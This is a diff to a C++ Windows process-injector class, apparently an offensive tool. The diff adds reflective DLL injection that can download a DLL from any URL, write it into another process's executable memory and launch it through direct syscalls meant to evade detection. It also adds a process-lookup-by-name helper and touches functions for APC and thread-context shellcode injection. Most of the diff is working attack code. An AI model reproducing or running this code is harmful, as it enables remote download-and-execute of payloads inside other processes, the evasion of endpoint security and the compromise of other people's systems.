@@ -7,6 +7,7 @@
 
 #include <Windows.h>
 #include <tlhelp32.h>
+#include <wininet.h>
 
 Injector::Injector(std::string dll_path) {
     this->DllPath = dll_path;
@@ -202,108 +203,7 @@ void Injector::unInject(DWORD pid) {
 
 /*                  Reflect DLL Injection                  */
 void Injector::reflectInject(DWORD pid) {
-    if (!this->bPreInjectCheck(pid))
-        return;
-
-    HANDLE hFile = CreateFileA(this->DllPath.c_str(), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hFile == INVALID_HANDLE_VALUE) {
-        Error::ErrorMsgBox(L"Create File Failed");
-        return;
-    }
-    DWORD dwFileSize = GetFileSize(hFile, NULL);
-    if (dwFileSize == 0) {
-        Error::ErrorMsgBox(L"File Size is Zero!");
-        CloseHandle(hFile);
-        return;
-    }
-
-    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-    if (hProcess == INVALID_HANDLE_VALUE) {
-        Error::ErrorMsgBox(L"Allocate Address or Open Process Failed");
-        CloseHandle(hFile);
-        return;
-    }
-
-    LPVOID pBase = VirtualAllocEx(hProcess, NULL, (SIZE_T)dwFileSize + 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-    if (pBase == NULL) {
-        Error::ErrorMsgBox(L"Allocate Memory Failed");
-        CloseHandle(hFile);
-        CloseHandle(hProcess);
-        return;
-    }
-
-    SIZE_T dwWriteSize = 0;
-    char* buffer = new char[dwFileSize];
-    DWORD dwReadSize;
-    if (::ReadFile(hFile, buffer, dwFileSize, &dwReadSize, NULL) == FALSE) {
-        Error::ErrorMsgBox(L"Failed to read the file.");
-        delete[] buffer;
-        VirtualFreeEx(hProcess, pBase, (SIZE_T)dwFileSize + 1, MEM_COMMIT);
-        CloseHandle(hFile);
-        CloseHandle(hProcess);
-        return;
-    }
-
-
-    DWORD dwReflectiveLoaderOffset = this->dwGetOffset(buffer, (CHAR*)"ReflectiveLoader");
-    if (dwReflectiveLoaderOffset == 0) {
-        Error::ErrorMsgBox(L"Get Export Function Error");
-        delete[] buffer;
-        VirtualFreeEx(hProcess, pBase, (SIZE_T)dwFileSize + 1, MEM_COMMIT);
-        CloseHandle(hFile);
-        CloseHandle(hProcess);
-        return;
-    }
-
-    bool bRet = WriteProcessMemory(hProcess, pBase, buffer, dwFileSize, &dwWriteSize);
-    if (dwWriteSize != dwFileSize) {
-        Error::ErrorMsgBox(L"File Load partitially");
-        delete[] buffer;
-        VirtualFreeEx(hProcess, pBase, (SIZE_T)dwFileSize + 1, MEM_COMMIT);
-        CloseHandle(hFile);
-        CloseHandle(hProcess);
-        return;
-    }
-    //LPTHREAD_START_ROUTINE lpReflectiveLoader = (LPTHREAD_START_ROUTINE)((ULONG_PTR)pBase + dwReflectiveLoaderOffset);
-    LPTHREAD_START_ROUTINE lpReflectiveLoader = reinterpret_cast<LPTHREAD_START_ROUTINE>(
-                    reinterpret_cast<ULONG_PTR>(pBase)+ dwReflectiveLoaderOffset
-        );
-
-    HANDLE hThread = NULL;
-#ifdef _WIN64
-    NTSTATUS status = Sw3NtCreateThreadEx(&hThread, 0x1FFFFF, NULL, hProcess, (LPTHREAD_START_ROUTINE)lpReflectiveLoader, pBase, FALSE, NULL, NULL, NULL, NULL);
-    if (hThread == INVALID_HANDLE_VALUE || hThread == NULL || status != STATUS_SUCCESS) {
-        Error::ErrorMsgBox(L"Create Thread Failed");
-        delete[] buffer;
-        VirtualFreeEx(hProcess, pBase, (SIZE_T)dwFileSize + 1, MEM_COMMIT);
-        CloseHandle(hFile);
-        CloseHandle(hProcess);
-        return;
-    }
-#else
-#ifdef _WIN32
-    // Win32 dont support syscall yet
-    hThread = CreateRemoteThread(hProcess, NULL, 1024 * 1024, lpReflectiveLoader, pBase, (DWORD)NULL, NULL);
-    if (hThread == INVALID_HANDLE_VALUE || hThread == NULL) {
-        Error::ErrorMsgBox(L"Create Thread Failed");
-        delete[] buffer;
-        VirtualFreeEx(hProcess, pBase, (SIZE_T)dwFileSize + 1, MEM_COMMIT);
-        CloseHandle(hFile);
-        CloseHandle(hProcess);
-        return;
-    }
-#endif // _WIN32
-
-#endif // _WIN64
-
-
-    WaitForSingleObject(hThread, 500);
-
-    delete[] buffer;
-    VirtualFreeEx(hProcess, pBase, (SIZE_T)dwFileSize + 1, MEM_COMMIT);
-    CloseHandle(hFile);
-    CloseHandle(hProcess);
-    CloseHandle(hThread);
+    this->atomReflectInject(pid);
 }
 
 
@@ -370,7 +270,6 @@ void Injector::apcInject(DWORD pid) {
     PMySYSTEM_PROCESS_INFORMATION processInfo = reinterpret_cast<PMySYSTEM_PROCESS_INFORMATION>(buffer.data());
     for (; processInfo; ) {
         if (reinterpret_cast<DWORD>(processInfo->ProcessId) == pid) {
-        //if (DWORD(processInfo->ProcessId) == pid) {
             // loop thread
             for (ULONG i = 0; i < processInfo->NumberOfThreads; i++) {
                 hThread = OpenThread(
@@ -389,7 +288,6 @@ void Injector::apcInject(DWORD pid) {
         }
         if (processInfo->NextEntryOffset == 0)
             break;
-        //processInfo = (PSYSTEM_PROCESS_INFORMATION)((BYTE*)processInfo + processInfo->NextEntryOffset);
         processInfo = reinterpret_cast<PMySYSTEM_PROCESS_INFORMATION>(
             reinterpret_cast<PBYTE>(processInfo) + processInfo->NextEntryOffset
             );
@@ -400,9 +298,14 @@ void Injector::apcInject(DWORD pid) {
     CloseHandle(hProcess);
 }
 
-/*                  APC Dispatch Injection                  */
+/*                  using fiber thread Injection                  */
 void Injector::fiberInject(DWORD pid) {
 
+}
+
+/*                  Reflect Inject using dll from internet                   */                
+void Injector::internetInject(DWORD pid, std::string url) {
+    this->atomReflectInject(pid, url);
 }
 
 /*                  List Injectable Process                  */
@@ -462,6 +365,7 @@ std::vector<ProcessInfo> Injector::injectList() {
 
     //std::reverse(procInfo.begin(), procInfo.end());
     //note: remove, due to fast refresh
+    std::reverse(procInfo.begin(),procInfo.end());
     return procInfo;
 }
 
@@ -520,7 +424,6 @@ void Injector::shellcodeInject(std::string basedsc, DWORD pid) {
 
 
 /*                  Inject Shellcode With APC Dispatch                 */
-//TODO:
 void Injector::apcShellcodeInject(std::string basedsc, DWORD pid) {
     BOOL bRet;
 
@@ -596,7 +499,6 @@ void Injector::apcShellcodeInject(std::string basedsc, DWORD pid) {
 
 
 /*                  Inject Shellcode With Context Resume                 */
-//TODO:
 void Injector::contextShellcodeInject(std::string basedsc, DWORD pid) {
     BOOL bRet;
 
@@ -711,6 +613,27 @@ void Injector::contextShellcodeInject(std::string basedsc, DWORD pid) {
 }
 
 
+/*                  Get processs id by process name                 */
+DWORD Injector::getPidByName(LPCSTR procName) {
+    std::vector<ProcessInfo> list = this->injectList();
+
+    // 将 char* 转换为 wchar_t*
+    int len = MultiByteToWideChar(CP_UTF8, 0, procName, -1, nullptr, 0);
+    if (len == 0) {
+        return len;
+    }
+
+    // 分配缓冲区并进行转换
+    wchar_t* wideStrConverted = new wchar_t[len];
+    MultiByteToWideChar(CP_UTF8, 0, procName, -1, wideStrConverted, len);
+
+    for (auto l : list) {
+
+        if (wcsstr(l.processName.c_str(), wideStrConverted))
+            return l.pid;
+    }
+    return 0;
+}
 
 /*                  Some Gadget                  */
 bool Injector::bFileExists(std::string filePath) {
@@ -798,6 +721,160 @@ bool Injector::bGetModule(DWORD pid, MODULEENTRY32& result) {
 
     return bRet;
 
+}
+
+//原子反射式注入
+void Injector::atomReflectInject(DWORD pid, std::string url) {
+    if (pid == 0) {
+        Error::ErrorMsgBox(L"Invalid PID");
+        return;
+    }
+
+    if (!this->bInjectable(pid)) {
+        Error::ErrorMsgBox(L"Not Injectable");
+        return;
+    }
+
+    HANDLE hFile = NULL;
+    DWORD dwFileSize = 0;
+    SIZE_T dwWriteSize = 0;
+    std::string buffer = "";
+    DWORD dwReadSize;
+
+    if (url.empty()) {   //url内容为空
+                         //使用本地文件注入
+        hFile = CreateFileA(this->DllPath.c_str(), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+        if (hFile == INVALID_HANDLE_VALUE) {
+            Error::ErrorMsgBox(L"Create File Failed");
+            return;
+        }
+        dwFileSize = GetFileSize(hFile, NULL);
+        if (dwFileSize == 0) {
+            Error::ErrorMsgBox(L"File Size is Zero!");
+            CloseHandle(hFile);
+            return;
+        }
+
+        std::vector<char> tempBuffer(dwFileSize);
+        if (::ReadFile(hFile, tempBuffer.data(), dwFileSize, &dwReadSize, NULL) == FALSE) {
+            Error::ErrorMsgBox(L"Failed to read the file.");
+            CloseHandle(hFile);
+            return;
+        }
+        buffer.assign(tempBuffer.begin(), tempBuffer.end());
+    }
+    else {
+        //根据url下载dll，更新 buffer
+        try
+        {
+            // 初始化 WinINet
+            HINTERNET hInternet = InternetOpenA(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+            if (hInternet == NULL) {
+                throw "";
+            }
+
+            // 创建 HTTP 连接
+            HINTERNET hConnect = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
+            if (hConnect == NULL) {
+                InternetCloseHandle(hInternet);
+                throw "";
+            }
+
+            // 读取响应数据
+            char tempBuffer[4096];
+            DWORD bytesRead = 0;
+            while (InternetReadFile(hConnect, tempBuffer, sizeof(tempBuffer), &bytesRead) && bytesRead > 0) {
+                buffer.append(tempBuffer, bytesRead);
+            }
+            // 关闭连接
+            InternetCloseHandle(hConnect);
+            InternetCloseHandle(hInternet);
+
+        }
+        catch (...)
+        {
+            MessageBox(NULL, L"Failed Download DLL From URL", L"Error", MB_OK);
+            return;
+        }
+        dwFileSize = buffer.size();
+    }
+
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    if (hProcess == INVALID_HANDLE_VALUE) {
+        Error::ErrorMsgBox(L"Allocate Address or Open Process Failed");
+        if (hFile != NULL)
+            CloseHandle(hFile);
+        return;
+    }
+
+    LPVOID pBase = VirtualAllocEx(hProcess, NULL, (SIZE_T)dwFileSize + 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    if (pBase == NULL) {
+        Error::ErrorMsgBox(L"Allocate Memory Failed");
+        if (hFile != NULL)
+            CloseHandle(hFile);
+        CloseHandle(hProcess);
+        return;
+    }
+
+    DWORD dwReflectiveLoaderOffset = this->dwGetOffset((HANDLE)&(buffer[0]), (CHAR*)"ReflectiveLoader");
+    if (dwReflectiveLoaderOffset == 0) {
+        Error::ErrorMsgBox(L"Get Export Function Error");
+        VirtualFreeEx(hProcess, pBase, (SIZE_T)dwFileSize + 1, MEM_COMMIT);
+        if (hFile != NULL)
+            CloseHandle(hFile);
+        CloseHandle(hProcess);
+        return;
+    }
+
+    bool bRet = WriteProcessMemory(hProcess, pBase, &(buffer[0]), dwFileSize, &dwWriteSize);
+    if (dwWriteSize != dwFileSize) {
+        Error::ErrorMsgBox(L"File Load partitially");
+        VirtualFreeEx(hProcess, pBase, (SIZE_T)dwFileSize + 1, MEM_COMMIT);
+        if (hFile != NULL)
+            CloseHandle(hFile);
+        CloseHandle(hProcess);
+        return;
+    }
+
+    LPTHREAD_START_ROUTINE lpReflectiveLoader = reinterpret_cast<LPTHREAD_START_ROUTINE>(
+        reinterpret_cast<ULONG_PTR>(pBase) + dwReflectiveLoaderOffset
+        );
+
+    HANDLE hThread = NULL;
+#ifdef _WIN64
+    NTSTATUS status = Sw3NtCreateThreadEx(&hThread, 0x1FFFFF, NULL, hProcess, (LPTHREAD_START_ROUTINE)lpReflectiveLoader, pBase, FALSE, NULL, NULL, NULL, NULL);
+    if (hThread == INVALID_HANDLE_VALUE || hThread == NULL || status != STATUS_SUCCESS) {
+        Error::ErrorMsgBox(L"Create Thread Failed");
+        VirtualFreeEx(hProcess, pBase, (SIZE_T)dwFileSize + 1, MEM_COMMIT);
+        if (hFile != NULL)
+            CloseHandle(hFile);
+        CloseHandle(hProcess);
+        return;
+    }
+#else
+#ifdef _WIN32
+    // Win32 dont support syscall yet
+    hThread = CreateRemoteThread(hProcess, NULL, 1024 * 1024, lpReflectiveLoader, pBase, (DWORD)NULL, NULL);
+    if (hThread == INVALID_HANDLE_VALUE || hThread == NULL) {
+        Error::ErrorMsgBox(L"Create Thread Failed");
+        //delete[] buffer;
+        VirtualFreeEx(hProcess, pBase, (SIZE_T)dwFileSize + 1, MEM_COMMIT);
+        CloseHandle(hFile);
+        CloseHandle(hProcess);
+        return;
+    }
+#endif // _WIN32
+
+#endif // _WIN64
+
+
+    WaitForSingleObject(hThread, 500);
+
+    VirtualFreeEx(hProcess, pBase, (SIZE_T)dwFileSize + 1, MEM_COMMIT);
+    if(hFile != NULL)
+        CloseHandle(hFile);
+    CloseHandle(hProcess);
+    CloseHandle(hThread);
 }
 
 DWORD Injector::dwGetOffset(HANDLE Image, CHAR* FuncName) {
